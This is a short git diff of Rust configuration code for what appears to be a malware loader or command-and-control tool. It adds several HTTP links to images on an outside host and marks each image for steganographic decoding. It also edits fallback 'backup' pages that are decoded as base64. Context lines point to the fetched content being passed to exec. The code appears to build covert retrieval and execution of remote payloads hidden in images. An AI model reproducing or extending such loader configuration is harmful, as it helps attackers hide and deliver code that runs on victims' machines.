@@ -188,15 +188,33 @@ exec(decoded_script)
                         jitt: 0,
                         sleep: 0,
                     }),
+                    Link::HTTP(HTTPLink {
+                        url: String::from("https://kaboum.xyz/artdonjon/troll.png"),
+                        dataoperation: vec![DataOperation::STEGANO],
+                        jitt: 0,
+                        sleep: 0,
+                    }),
+                    Link::HTTP(HTTPLink {
+                        url: String::from("https://kaboum.xyz/artdonjon/troll1.png"),
+                        dataoperation: vec![DataOperation::STEGANO],
+                        jitt: 0,
+                        sleep: 0,
+                    }),
+                    Link::HTTP(HTTPLink {
+                        url: String::from("https://kaboum.xyz/artdonjon/troll2.png"),
+                        dataoperation: vec![DataOperation::STEGANO],
+                        jitt: 0,
+                        sleep: 0,
+                    }),
                 ],
-                pool_mode: PoolMode::ONEBYONE,
+                pool_mode: PoolMode::TOGETHER,
             },
         ),
         (
             "2 backup".to_string(),
             PoolLinks {
                 pool_links: vec![Link::HTTP(HTTPLink {
-                    url: String::from("https://kaboum.xyz/artdonjon/backup.html"),
+                    url: String::from("https://kaboum.xyz/artdonjon/backup1.html"),
                     dataoperation: vec![DataOperation::WEBPAGE, DataOperation::BASE64],
                     jitt: 0,
                     sleep: 0,
@@ -208,7 +226,7 @@ exec(decoded_script)
             "3 backup".to_string(),
             PoolLinks {
                 pool_links: vec![Link::HTTP(HTTPLink {
-                    url: String::from("https://kaboum.xyz/artdonjon/backup.html"),
+                    url: String::from("https://kaboum.xyz/artdonjon/backup2.html"),
                     dataoperation: vec![DataOperation::WEBPAGE, DataOperation::BASE64],
                     jitt: 0,
                     sleep: 0,
